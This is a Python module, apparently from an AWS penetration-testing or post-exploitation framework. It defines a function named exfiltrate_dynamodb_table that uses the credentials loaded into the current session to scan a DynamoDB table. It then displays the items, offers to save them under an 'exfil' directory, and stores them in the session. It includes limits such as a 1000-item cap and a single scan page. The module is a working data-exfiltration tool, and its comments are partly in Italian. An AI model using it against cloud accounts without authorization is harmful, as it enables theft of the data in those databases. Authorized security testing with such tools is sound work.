import json
import os
from typing import Optional, Dict, Any, List

from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt, Confirm

from ...aws_session import AWSSessionManager

console = Console()


def _get_cached_tables(session_mgr: AWSSessionManager) -> List[Dict[str, Any]]:
    session_name = session_mgr.current_session
    if not session_name:
        return []
    return (
        session_mgr.enumerated_data.get(session_name, {}).get("dynamodb_tables", [])
        if session_name in session_mgr.enumerated_data
        else []
    )


def _normalize(obj: Any) -> Any:
    """
    Normalizza oggetti in qualcosa di JSON-serializzabile (datetime/Decimal -> str).
    """
    if isinstance(obj, (str, int, float, bool)) or obj is None:
        return obj
    if isinstance(obj, (list, tuple)):
        return [_normalize(x) for x in obj]
    if isinstance(obj, dict):
        return {k: _normalize(v) for k, v in obj.items()}
    return str(obj)


def exfiltrate_dynamodb_table(
    session_mgr: AWSSessionManager,
    table_name: Optional[str] = None,
    limit_arg: Optional[str] = None,
):
    """
    Exfiltrate items from a DynamoDB table using Scan.

    Usage:
      exfiltrate_dynamodb_table
        -> chiede TableName e usa limit default (100).

      exfiltrate_dynamodb_table analytics_app_users
        -> scan della tabella con limit 100.

      exfiltrate_dynamodb_table analytics_app_users 500
        -> scan con limit 500 (hard cap 1000).

    Note:
      - Usa cache 'dynamodb_tables' per determinare la regione se possibile.
      - Esegue UNA sola pagina di Scan (no full-dump) per evitare incidenti.
    """
    if not session_mgr.current_session_data.get("access_key"):
        console.print("[red]No credentials in current session. Run 'set_keys'.[/red]")
        return

    if not table_name:
        table_name = Prompt.ask("[cyan]DynamoDB TableName[/cyan]")

    if not table_name:
        console.print("[red]Empty table name, aborting.[/red]")
        return

    # Determina il limit
    default_limit = 100
    max_limit = 1000
    limit = default_limit
    if limit_arg:
        try:
            limit = int(limit_arg)
        except ValueError:
            console.print(
                f"[yellow]Invalid limit '{limit_arg}', falling back to {default_limit}.[/yellow]"
            )
            limit = default_limit
    if limit <= 0:
        limit = default_limit
    if limit > max_limit:
        console.print(
            f"[yellow]Limit {limit} is too high, capping to {max_limit} for safety.[/yellow]"
        )
        limit = max_limit

    cached = _get_cached_tables(session_mgr)

    cached_entry: Optional[Dict[str, Any]] = None
    for t in cached:
        if t.get("TableName") == table_name:
            cached_entry = t
            break

    region = None
    if cached_entry:
        region = cached_entry.get("Region")

    if not region:
        region = session_mgr.current_session_data.get("region")

    if not region:
        console.print(
            "[red]Unable to determine region for that table. "
            "Set a default region with 'set_regions' or run 'enumerate_dynamodb' first.[/red]"
        )
        return

    console.print(
        f"[bold blue]📤 Scanning DynamoDB table '{table_name}' in region {region} (limit={limit})...[/bold blue]"
    )

    aws_sess = session_mgr.get_boto3_session()
    ddb = aws_sess.client("dynamodb", region_name=region)

    try:
        resp = ddb.scan(TableName=table_name, Limit=limit)
    except Exception as e:
        console.print(f"[red]Failed to scan table '{table_name}': {str(e)}[/red]")
        console.print(
            "[yellow]Ensure dynamodb:Scan (and proper read capacity) for that table.[/yellow]"
        )
        return

    items = resp.get("Items", [])
    count = resp.get("Count", 0)
    scanned_count = resp.get("ScannedCount", 0)
    last_evaluated_key = resp.get("LastEvaluatedKey")

    console.print(
        f"[green]Scan returned {count} item(s), scanned {scanned_count} item(s) in the table/index.[/green]"
    )
    if last_evaluated_key:
        console.print(
            "[yellow]More data is available (LastEvaluatedKey present). "
            "This module only fetches a single page for safety.[/yellow]"
        )

    if not items:
        console.print("[yellow]No items returned by Scan (empty table or filter conditions).[/yellow]")
    else:
        # Summary table of items
        sample = items[0]
        attr_names = list(sample.keys())

        # Limitiamo a max 8 colonne
        max_cols = 8
        truncated_cols = False
        if len(attr_names) > max_cols:
            attr_names = attr_names[:max_cols]
            truncated_cols = True

        it_table = Table(
            title=f"DynamoDB Scan Sample Items (showing up to {len(items)} items)"
        )
        for name in attr_names:
            it_table.add_column(name)

        max_rows = 20
        for itm in items[:max_rows]:
            row = []
            for name in attr_names:
                v = itm.get(name)
                # AttributeValue -> stringa compatta
                v_str = json.dumps(v, default=str)
                if len(v_str) > 60:
                    v_str = v_str[:57] + "..."
                row.append(v_str)
            it_table.add_row(*row)

        console.print(it_table)

        if truncated_cols:
            console.print(
                "[dim]Columns truncated: showing only the first "
                f"{max_cols} attributes per item.[/dim]"
            )

        if len(items) > max_rows:
            console.print(
                f"[dim]Rows truncated: showing first {max_rows} items out of {len(items)} "
                "returned by this Scan.[/dim]"
            )

        # Option: save full JSON to disk
        if Confirm.ask(
            "[cyan]Do you want to save the full Scan result (this page) to a local JSON file?[/cyan]",
            default=False,
        ):
            exfil_dir = session_mgr.get_exfil_dir("dynamodb")
            default_filename = f"dynamodb_scan_{table_name}.json"
            default_path = str(exfil_dir / default_filename)
            filename = Prompt.ask("[cyan]Output file path[/cyan]", default=default_path).strip()
            if not filename:
                filename = default_path

            normalized_items = _normalize(items)
            out_obj = {
                "TableName": table_name,
                "Region": region,
                "Limit": limit,
                "Count": count,
                "ScannedCount": scanned_count,
                "LastEvaluatedKey": _normalize(last_evaluated_key),
                "Items": normalized_items,
            }

            try:
                with open(filename, "w", encoding="utf-8") as f:
                    json.dump(out_obj, f, ensure_ascii=False, indent=2)
                console.print(f"[green]Full scan page saved to:[/green] {os.path.abspath(filename)}")
            except Exception as e:
                console.print(f"[red]Failed to write JSON file: {str(e)}[/red]")

    # Save to session
    normalized_items = _normalize(items)
    normalized_last_key = _normalize(last_evaluated_key)

    session_mgr.save_enumeration_data(
        "dynamodb_scan_result",
        {
            "TableName": table_name,
            "Region": region,
            "Limit": limit,
            "Count": count,
            "ScannedCount": scanned_count,
            "LastEvaluatedKey": normalized_last_key,
            "Items": normalized_items,
        },
    )

    console.print(
        "[green]Scan result stored under key 'dynamodb_scan_result' in session data.[/green]"
    )
